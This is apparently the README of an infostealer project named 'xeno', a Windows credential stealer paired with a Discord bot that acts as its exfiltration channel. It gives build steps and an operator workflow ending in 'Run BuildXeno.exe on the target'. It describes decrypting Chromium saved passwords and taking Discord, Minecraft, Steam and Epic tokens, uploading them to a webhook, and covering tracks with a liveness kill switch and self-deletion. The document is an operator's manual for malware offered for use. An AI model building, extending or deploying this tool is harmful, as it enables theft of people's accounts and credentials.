# xeno

Two binaries.

| Path | What it is |
|---|---|
| `BuildXeno/BuildXeno.cpp` | GUI-subsystem stealer. Chromium logins, Discord tokens, Minecraft launcher tokens, Steam accounts, Epic id/apps. Uploads one JSON dump to a Discord webhook. Self-deletes when the bot is not alive. |
| `XenoBot/XenoBot.cpp` | Console Discord bot. `.l #channel` binds the exfil channel, mints a webhook, and starts a liveness heartbeat. `/secure` sweeps a server. |

## Build

Needs **either** Visual Studio 2022 (Desktop C++) **or** MinGW-w64. No third-party libraries.

```bat
:: MSVC — from "x64 Native Tools Command Prompt for VS 2022"
cd BuildXeno && build.bat
cd ..\XenoBot && build.bat

:: MinGW-w64 — normal cmd, g++ on PATH
cd BuildXeno && build-mingw.bat
cd ..\XenoBot && build-mingw.bat
```

Flags are `/O2 /std:c++17 /W4 /permissive-` on MSVC, `-O2 -Wall -Wextra` on GCC. `BuildXeno` links as a GUI subsystem binary so it never flashes a console.

## Order of operations

1. Create the bot at <https://discord.com/developers/applications>.
   - Bot tab: copy the token.
   - Bot tab: enable **Message Content Intent** (`.l` needs it).
   - OAuth2 URL generator: scopes `bot` + `applications.commands`; permissions `Manage Messages`, `Moderate Members`, `Manage Channels`, `Manage Webhooks`.
2. Put the token in `XenoBot/xeno.cfg` (`token=...`) or export `XENO_TOKEN`.
   - A real bot token looks like `MTIzNDU2Nzg5MDEyMzQ1Njc4.GaBcDe.abcdefghijklmnopqrstuvwxyz0123456789AB` — three dot-separated parts.
   - Validate before running: `curl -H "Authorization: Bot <token>" https://discord.com/api/v10/users/@me`. Anything other than `200` means the token is wrong or was reset.
3. Run `XenoBot.exe` (or `go.bat` from the repo root). It registers `/secure` globally on first start.
4. In your server: `.l #exfil` — only `1416085051854164125` can run it. It **locks the channel**: `@everyone` loses `View Channel` and `Send Messages`, the bot and you keep access, every other overwrite on that channel is replaced. Then it mints a webhook, prints the URL, starts its heartbeat, and writes `XenoBot/xeno_target.h`.
   - The bot needs `Manage Channels` for the lock to land. If it fails, the reply says so and the webhook still works.
5. Rebuild `BuildXeno` (`build.bat` or `build-mingw.bat`). It picks up `xeno_target.h` via `/I ..\XenoBot`. No manual pasting.
6. Run `BuildXeno.exe` on the target. The dump lands in `#exfil` as `xeno_dump.json`.

`xeno_target.h` is regenerated every time you run `.l`, so re-binding a channel is: `.l #newchannel` → rebuild stealer.

## Kill switch

`BuildXeno` will not run unless the bot is alive.

- On `READY`, and again the moment `.l` binds a channel, the bot posts one message: `xeno-alive <unix>`.
- A background thread edits that same message every 45 s. One message, no spam, no rate-limit pressure.
- Before harvesting anything, `BuildXeno` does `GET /channels/{BOT_CHANNEL}/messages?limit=1`, finds `xeno-alive`, and parses the timestamp.
- Stale by more than 180 s, missing, unreadable, or the request fails → `self_delete()` and exit. No collection, no upload.
- Same path fires if the multipart upload fails: nothing landed, so the binary does not linger.

`self_delete()` cannot unlink a running image, so it:

1. Queues `MoveFileExW(..., MOVEFILE_DELAY_UNTIL_REBOOT)` as a boot-time fallback.
2. Writes a batch file to `%TEMP%` that retries `del /f /q <own path>` every second until the handle drops.
3. Launches it detached with `CREATE_NO_WINDOW`, then the batch deletes itself.

Result: the exe is gone within a second or two of the check failing, and gone again at next boot if the first pass lost the race.

## What BuildXeno collects

| Source | Method |
|---|---|
| Chrome / Edge / Brave / Vivaldi | `Local State` master key → DPAPI unwrap → AES-256-GCM decrypt of `Login Data` (minimal SQLite b-tree reader, no sqlite3 dependency) |
| Discord stable / canary / PTB / Lightcord | plaintext token scan inside `Local Storage\leveldb\*.ldb` and `*.log` |
| Minecraft | `%APPDATA%\.minecraft\launcher_accounts.json` → `accessToken` + profile name |
| Steam | `config\loginusers.vdf` account names, `config.vdf` `ConnectCache` tokens, `ssfn*` blobs |
| Epic | `HKCU\Software\Epic Games\Unreal Engine\Identifiers\AccountId`, `LauncherInstalled.dat`, Credential Manager entries matching `epic` |

**Known limit:** Chrome 127+ writes `v20` passwords sealed with an app-bound key that DPAPI alone cannot unwrap. Those rows come back marked `v20 app-bound`. `v10` rows decrypt normally.

## What `/secure` does

- Requires `Manage Server` or `Administrator` on the invoker.
- Deletes every invite in the guild.
- Scans the last 100 messages in up to 20 text channels per pass.
- Deletes messages containing invite links, any `http(s)://`, `nitro`, `free`, `@everyone`, `@here`.
- Times out anyone who says the standalone word `rat` for 10 minutes.
- Re-run it for older history; pagination is intentionally bounded so one invocation cannot hang the gateway.

## Rate limits

`/secure` sleeps 220 ms between deletes (the 5-per-5-seconds bucket). A full sweep of 20 busy channels takes ~2 minutes. The bot defers the interaction immediately, so Discord will not time it out.

## Notes

- `xeno.cfg` is written next to `XenoBot.exe` and holds the token in plaintext. Keep it off shared drives.
- The bot reconnects on op 7/op 9 with a 3 s backoff.
- `BuildXeno` deduplicates entries on `(note, secret)` before upload.
